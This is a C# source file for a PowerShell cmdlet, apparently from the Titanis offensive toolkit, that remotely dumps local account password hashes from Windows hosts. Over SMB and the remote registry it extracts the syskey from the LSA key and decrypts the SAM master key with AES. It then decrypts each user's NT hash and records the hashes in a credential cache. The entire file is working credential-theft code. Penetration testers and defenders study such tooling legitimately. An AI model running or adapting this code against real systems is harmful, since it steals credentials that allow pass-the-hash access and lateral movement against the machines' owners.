using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Globalization;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Msrpc.Msrrp.Cli;
using Titanis.Winterop;
using Titanis.Winterop.Security;
using Titanis.Winterop.Sam;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegSamHashInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? AccountName { get; init; }
		public string? FullName { get; init; }
		public uint Rid { get; init; }
		public byte[]? NtlmHash { get; init; }
		public string? NtlmHashText { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegSamHashes")]
	[OutputType(typeof(TboRegSamHashInfo))]
	public sealed class GetTBORegSamHashes : TboRegCmdlet
	{
		private sealed record SamUserReadResult(List<TboRegSamHashInfo> Users, SecurityIdentifier? AccountDomainSid);

		private const string SamAccountPath = @"SAM\SAM\Domains\Account";
		private const string SamUsersPath = @"SAM\SAM\Domains\Account\Users";
		private const int SamUserAttrCount = 17;
		private const int SamUserAttrInfoSize = 12;
		private static readonly RegistryRetryOptions SamRetryOptions = new(
			RegistryRetryPolicy.Practical,
			retryCount: 10,
			delayMs: 250,
			maxDelayMs: 4000,
			jitterMs: 250);

		[Parameter]
		public SwitchParameter Cache { get; set; }

		[Parameter]
		public string? CachePath { get; set; }

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			var ingestCache = this.ResolveCacheIngestionEnabled(this.Cache);

			byte[]? syskey = null;
			try
			{
				ExecuteRegistryOperation(smb, cancellationToken, session =>
				{
					var cache = TryGetSecretCache(session);
					if (cache != null && cache.TryGetBootKey(out var cachedKey))
					{
						syskey = cachedKey;
						LogDiagnostic(smb, $"TBO: Registry secret cache hit (syskey) for {this.ServerName}.");
						return;
					}

					LogDiagnostic(smb, $"TBO: Registry secret cache miss (syskey) for {this.ServerName}.");
					LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
					var localMachineSpec = new RegistryPathSpec(
						RegistryRootKey.LocalMachine,
						RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
						null);
					using var localMachineKey = OpenRegistryKey(
						session.Client,
						localMachineSpec,
						RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
						cancellationToken);
					LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
					syskey = ExtractSyskey(smb, localMachineKey, cancellationToken);
					LogDiagnostic(smb, $"Get-TBORegSamHashes: syskey extracted on {this.ServerName}.");
					if (syskey != null && syskey.Length > 0)
						cache?.SetBootKey(syskey);
				});
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBORegSamHashes failed to derive syskey for {this.ServerName}", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to derive syskey: {ex.Message}");
				return;
			}

			if (syskey == null || syskey.Length == 0)
			{
				this.LogWarning(smb, "Get-TBORegSamHashes failed to derive syskey: value is empty.");
				return;
			}

			SamUserReadResult result;
			try
			{
				result = RegistryRetryHelper.Execute(smb, this.ServerName, cancellationToken, SamRetryOptions, session =>
				{
					return ReadSamUsers(smb, session, syskey, deriveAccountDomainSid: ingestCache, cancellationToken);
				});
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBORegSamHashes failed to read SAM data for {this.ServerName}", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM data: {ex.Message}");
				return;
			}

			foreach (var info in result.Users)
			{
				if (ingestCache && !string.IsNullOrWhiteSpace(info.NtlmHashText))
				{
					var principalSid = result.AccountDomainSid != null
						// Use canonical SID text, not SDDL aliases (e.g. "LA"), so domain-scoped
						// local accounts from different machines do not collapse in cache identity.
						? result.AccountDomainSid.Concat(info.Rid).ToString()
						: null;

					try
					{
						var contextJson = $"{{\"rid\":{info.Rid.ToString(CultureInfo.InvariantCulture)}}}";
						TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
						{
							ServerName = this.ServerName,
							SourceKind = "Get-TBORegSamHashes",

							// Prefer full local account SID (machine SID + RID) when derivable.
							// If SID derivation fails, scope the SID-less identity to the current machine
							// to avoid cross-host collisions on common local names.
							PrincipalSid = principalSid,
							PrincipalDomain = this.ServerName,
							PrincipalName = info.AccountName,
							PrincipalType = "LocalUser",

							CredentialKind = "NTHash",
							CredentialIdentifier = info.NtlmHashText,

							Confidence = 100,
							ContextJson = contextJson,
							CachePath = this.CachePath
						}, msg => LogDiagnostic(smb, msg));
					}
					catch (Exception ex)
					{
						this.LogException(smb, $"Get-TBORegSamHashes failed to write cache observation for {this.ServerName}", ex);
						this.LogWarning(smb, $"Get-TBORegSamHashes cache write failed: {ex.Message}");
					}
				}

				this.WriteObject(info);
			}
		}

		private SamUserReadResult ReadSamUsers(
			ISmbProviderInfo smb,
			IRegistrySession session,
			byte[] syskey,
			bool deriveAccountDomainSid,
			CancellationToken cancellationToken)
		{
			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
			var localMachineSpec = new RegistryPathSpec(
				RegistryRootKey.LocalMachine,
				RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
				null);
			using var localMachineKey = OpenRegistryKey(
				session.Client,
				localMachineSpec,
				RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
				cancellationToken);
			LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
			var cache = TryGetSecretCache(session);

			SecurityIdentifier? accountDomainSid = null;
			if (deriveAccountDomainSid && cache != null && cache.TryGetSamAccountDomainSid(out var cachedSidText))
			{
				try
				{
					accountDomainSid = SecurityIdentifier.Parse(cachedSidText);
					LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM account domain SID) for {this.ServerName}.");
				}
				catch
				{
					accountDomainSid = null;
				}
			}

			SamStore? store = null;
			byte[]? cachedMasterKey = null;
				var hasCachedMasterKey = cache != null && cache.TryGetSamMasterKey(out cachedMasterKey);
				if (hasCachedMasterKey)
				{
					LogDiagnostic(smb, $"TBO: Registry secret cache hit (SAM master key) for {this.ServerName}.");
					store = new SamStore(cachedMasterKey!);
				}

			var needsAccountKey = !hasCachedMasterKey || (deriveAccountDomainSid && accountDomainSid == null);
			if (needsAccountKey)
			{
				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
				using var accountKey = localMachineKey.OpenSubkey(
					SamAccountPath,
					RegistryAccessRights.QueryValue | RegistryAccessRights.EnumerateSubkeys,
					RegistryHelpers.BackupOptions,
					cancellationToken).GetAwaiter().GetResult();

				if (!hasCachedMasterKey)
				{
					LogDiagnostic(smb, $"TBO: Registry secret cache miss (SAM master key) for {this.ServerName}.");
					store = ExtractSamStore(smb, accountKey, syskey, cancellationToken, out var masterKey);
					if (store?.HasMasterKey == true && masterKey != null && masterKey.Length > 0)
						cache?.SetSamMasterKey(masterKey);
				}

				if (deriveAccountDomainSid && accountDomainSid == null)
				{
					try
					{
							if (SamAccountDomainSidReader.TryReadAccountDomainSid(
								accountKey,
								cancellationToken,
								msg => LogDiagnostic(smb, msg),
								out var derived))
							{
								accountDomainSid = derived;
								if (accountDomainSid != null)
									cache?.SetSamAccountDomainSid(accountDomainSid.ToSddlString());
							}
						}
					catch (Exception ex)
					{
						LogDiagnostic(smb, $"Get-TBORegSamHashes: failed to derive SAM account domain SID: {ex.Message}");
					}
				}
			}
			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM store {(store?.HasMasterKey == true ? "has" : "missing")} master key on {this.ServerName}.");

			List<TboRegSamHashInfo> userInfos = new();
			if (store == null || !store.HasMasterKey)
				return new SamUserReadResult(userInfos, accountDomainSid);

			List<RegistrySubkeyInfo> users;
			Dictionary<uint, int> ridIndex = new();

			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM Users key on {this.ServerName}.");
			using var usersKey = localMachineKey.OpenSubkey(
				SamUsersPath,
				RegistryAccessRights.EnumerateSubkeys,
				RegistryHelpers.BackupOptions,
				cancellationToken).GetAwaiter().GetResult();
			try
			{
				users = CollectSubkeys(usersKey, cancellationToken);
				LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {users.Count} SAM user subkeys on {this.ServerName}.");
			}
			catch (Exception ex)
			{
				this.LogException(smb, "Get-TBORegSamHashes failed to enumerate SAM users", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
				return new SamUserReadResult(userInfos, accountDomainSid);
			}

			foreach (var userKeyInfo in users)
			{
				var keyName = userKeyInfo.KeyName;
				if (string.Equals(keyName, "Names", StringComparison.OrdinalIgnoreCase))
					continue;

				if (!uint.TryParse(keyName, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out var rid))
					continue;

				try
				{
					LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM user {keyName} on {this.ServerName}.");
					using var userKey = usersKey.OpenSubkey(
						keyName,
						RegistryAccessRights.QueryValue,
						RegistryHelpers.BackupOptions,
						cancellationToken).GetAwaiter().GetResult();
					var valueInfo = userKey.GetValue("V", cancellationToken).GetAwaiter().GetResult();
					var bytes = RegistryHelpers.ExtractValueBytes(valueInfo);
					LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM user {keyName} value size {(bytes?.Length ?? 0)} bytes on {this.ServerName}.");
					if (bytes == null || bytes.Length == 0)
					{
						this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM user {keyName}: value is empty.");
						continue;
					}

					if (!TryValidateSamUserRecord(bytes, out var reason))
					{
						this.LogWarning(smb, $"Get-TBORegSamHashes skipped SAM user {keyName}: {reason ?? "record is invalid"}.");
						continue;
					}

					var user = new SamUserRegistryObject(store, rid, ImmutableArray<byte>.Empty, ImmutableArray.Create(bytes));
					var ntHash = user.GetDecryptedNtHash();
					var accountName = user.AccountName;
					var info = new TboRegSamHashInfo
					{
						ServerName = this.ServerName,
						AccountName = accountName,
						FullName = user.FullName,
						Rid = rid,
						NtlmHash = ntHash,
						NtlmHashText = ntHash?.ToHexString()
					};
					ridIndex[rid] = userInfos.Count;
					userInfos.Add(info);
				}
				catch (Exception ex)
				{
					this.LogException(smb, $"Get-TBORegSamHashes failed to read SAM user {keyName}", ex);
					this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM user {keyName}: {ex.Message}");
				}
			}

			bool needsNameLookup = false;
			for (int i = 0; i < userInfos.Count; i++)
			{
				if (string.IsNullOrWhiteSpace(userInfos[i].AccountName))
				{
					needsNameLookup = true;
					break;
				}
			}

			if (needsNameLookup)
			{
				var nameLookup = TryReadSamUserNames(smb, usersKey, cancellationToken);
				if (nameLookup.Count > 0)
				{
					LogDiagnostic(smb, $"Get-TBORegSamHashes: correlating SAM Names ({nameLookup.Count} entries) to user RIDs.");
					foreach (var entry in nameLookup)
					{
						if (!ridIndex.TryGetValue(entry.Key, out var index))
							continue;

						var info = userInfos[index];
						if (!string.IsNullOrWhiteSpace(info.AccountName))
							continue;

						userInfos[index] = new TboRegSamHashInfo
						{
							ServerName = info.ServerName,
							AccountName = entry.Value,
							FullName = info.FullName,
							Rid = info.Rid,
							NtlmHash = info.NtlmHash,
							NtlmHashText = info.NtlmHashText
						};
					}
				}
				else if (userInfos.Count > 0)
				{
					this.LogWarning(smb, "Get-TBORegSamHashes could not correlate SAM account names; results may omit AccountName.");
				}
			}
			else if (userInfos.Count > 0)
			{
				LogDiagnostic(smb, "Get-TBORegSamHashes: SAM account names already populated; skipping Names correlation.");
			}

			return new SamUserReadResult(userInfos, accountDomainSid);
		}

		private byte[] ExtractSyskey(ISmbProviderInfo smb, IRegistryKey localMachineKey, CancellationToken cancellationToken)
		{
			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening LSA key {RegistryBootKeyReader.LsaKeyPath}.");
			using var lsaKey = localMachineKey.OpenSubkey(
				RegistryBootKeyReader.LsaKeyPath,
				RegistryAccessRights.QueryValue,
				RegistryHelpers.BackupOptions,
				cancellationToken).GetAwaiter().GetResult();
			LogDiagnostic(smb, $"Get-TBORegSamHashes: LSA key opened for {RegistryBootKeyReader.LsaKeyPath}.");

			return RegistryBootKeyReader.ExtractBootKey(lsaKey, lsaKey.KeyPath, cancellationToken, msg => LogDiagnostic(smb, msg));
		}

		private SamStore? ExtractSamStore(
			ISmbProviderInfo smb,
			IRegistryKey accountKey,
			byte[] syskey,
			CancellationToken cancellationToken,
			out byte[]? masterKey)
		{
			masterKey = null;
			var usersF = accountKey.GetValue("F", cancellationToken).GetAwaiter().GetResult();
			var fBytes = RegistryHelpers.ExtractValueBytes(usersF);
			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM account F value size {(fBytes?.Length ?? 0)} bytes.");
			if (fBytes == null || fBytes.Length < 136)
			{
				this.LogWarning(smb, "Get-TBORegSamHashes failed to read SAM account data: value is too short.");
				return null;
			}

			uint rev = BinaryPrimitives.ReadUInt32LittleEndian(fBytes.AsSpan(104, 4));
			if (rev != 2)
			{
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM account data: unsupported revision {rev}.");
				return null;
			}

			int cbData = BinaryPrimitives.ReadInt32LittleEndian(fBytes.AsSpan(116, 4));
			if (cbData <= 0 || 136 + cbData > fBytes.Length)
			{
				this.LogWarning(smb, "Get-TBORegSamHashes failed to read SAM account data: encrypted payload is invalid.");
				return null;
			}

			byte[] salt = fBytes.AsSpan(120, 16).ToArray();
			byte[] data = fBytes.AsSpan(136, cbData).ToArray();

			try
			{
				using var aes = Aes.Create();
				aes.Key = syskey;
				var decryptedMasterKey = aes.DecryptCbc(data, salt);
				masterKey = decryptedMasterKey;
				return new SamStore(decryptedMasterKey);
			}
			catch (Exception ex)
			{
				this.LogException(smb, "Get-TBORegSamHashes failed to decrypt SAM account data", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to decrypt SAM account data: {ex.Message}");
			}

			return null;
		}

		private Dictionary<uint, string> TryReadSamUserNames(
			ISmbProviderInfo smb,
			IRegistryKey usersKey,
			CancellationToken cancellationToken)
		{
			var results = new Dictionary<uint, string>();

			try
			{
				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM user Names key {SamUsersPath}\\Names.");
				using var namesKey = usersKey.OpenSubkey(
					"Names",
					RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
					RegistryHelpers.BackupOptions,
					cancellationToken).GetAwaiter().GetResult();

				var subkeys = CollectSubkeys(namesKey, cancellationToken);
				LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {subkeys.Count} SAM name entries.");
				foreach (var subkeyInfo in subkeys)
				{
					var name = subkeyInfo.KeyName;
					if (string.IsNullOrWhiteSpace(name))
						continue;

					try
					{
						LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM name entry {name}.");
						using var userKey = namesKey.OpenSubkey(name, RegistryAccessRights.QueryValue, RegistryHelpers.BackupOptions, cancellationToken).GetAwaiter().GetResult();
						if (TryReadRidFromNameKey(smb, userKey, name, cancellationToken, out var rid))
							results[rid] = name;
					}
					catch (Exception ex)
					{
						this.LogException(smb, $"Get-TBORegSamHashes failed to read SAM name entry {name}", ex);
						this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM name entry {name}: {ex.Message}");
					}
				}
			}
			catch (Exception ex)
			{
				this.LogException(smb, "Get-TBORegSamHashes failed to read SAM user name map", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to read SAM user name map: {ex.Message}");
			}

			return results;
		}

		private bool TryReadRidFromNameKey(
			ISmbProviderInfo smb,
			IRegistryKey userKey,
			string name,
			CancellationToken cancellationToken,
			out uint rid)
		{
			rid = 0;
			var valueInfo = userKey.GetValue(null, cancellationToken).GetAwaiter().GetResult();
			if (TryReadRid(valueInfo, out rid))
				return true;

			valueInfo = userKey.GetValue(string.Empty, cancellationToken).GetAwaiter().GetResult();
			if (TryReadRid(valueInfo, out rid))
				return true;

			var values = CollectValues(userKey, includeData: true, cancellationToken);
			if (values.Count == 0)
			{
				LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM name entry {name} has no values.");
				return TryReadRidFromClassName(smb, userKey, name, cancellationToken, out rid);
			}

			RegistryValueInfo? candidate = null;
			for (int i = 0; i < values.Count; i++)
			{
				if (string.IsNullOrEmpty(values[i].Name))
				{
					candidate = values[i];
					break;
				}
			}

			candidate ??= values[0];
			if (candidate != null && TryReadRid(candidate, out rid))
				return true;

			var bytes = candidate != null ? RegistryHelpers.ExtractValueBytes(candidate) : null;
			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM name entry {name} value size {(bytes?.Length ?? 0)} bytes is not a RID.");
			return TryReadRidFromClassName(smb, userKey, name, cancellationToken, out rid);
		}

		private bool TryReadRidFromClassName(
			ISmbProviderInfo smb,
			IRegistryKey userKey,
			string name,
			CancellationToken cancellationToken,
			out uint rid)
		{
			rid = 0;
			try
			{
				var info = userKey.QueryInfo(includeClass: true, cancellationToken).GetAwaiter().GetResult();
				var className = info.ClassName?.TrimEnd('\0');
				if (string.IsNullOrWhiteSpace(className))
				{
					LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM name entry {name} has empty class name.");
					return false;
				}

				if (uint.TryParse(className, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out rid))
				{
					LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM name entry {name} RID parsed from class {className}.");
					return true;
				}

				LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM name entry {name} class '{className}' is not a RID.");
				return false;
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBORegSamHashes failed to read class name for {name}", ex);
				this.LogWarning(smb, $"Get-TBORegSamHashes failed to read class name for {name}: {ex.Message}");
				return false;
			}
		}

		private static RegistrySecretCache? TryGetSecretCache(IRegistrySession session)
		{
			if (session is IRegistrySecretCacheProvider provider)
				return provider.SecretCache;

			return null;
		}

		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
		{
			if (smb is SmbProviderInfo provider)
			{
				provider.LogDiagnostic(message);
			}
		}

		private static bool TryReadRid(RegistryValueInfo info, out uint rid)
		{
			rid = 0;
			if (info.TypedValue is uint typedUint)
			{
				rid = typedUint;
				return true;
			}

			if (info.TypedValue is int typedInt && typedInt >= 0)
			{
				rid = (uint)typedInt;
				return true;
			}

			var bytes = RegistryHelpers.ExtractValueBytes(info);
			if (bytes == null || bytes.Length < 4)
				return false;

			rid = BinaryPrimitives.ReadUInt32LittleEndian(bytes.AsSpan(0, 4));
			return true;
		}

		private static bool TryValidateSamUserRecord(byte[] bytes, out string? reason)
		{
			reason = null;
			int attrTableSize = SamUserAttrCount * SamUserAttrInfoSize;
			if (bytes.Length < attrTableSize)
			{
				reason = "value is too short for the attribute table";
				return false;
			}

			for (int i = 0; i < SamUserAttrCount; i++)
			{
				int offset = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize, 4));
				int length = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize + 4, 4));

				if (offset < 0 || length < 0)
				{
					reason = $"attribute {i} has a negative offset or length";
					return false;
				}

				if (offset == 0 && length == 0)
					continue;

				long end = (long)attrTableSize + offset + length;
				if (end > bytes.Length)
				{
					reason = $"attribute {i} is out of range";
					return false;
				}
			}

			return true;
		}
	}
}
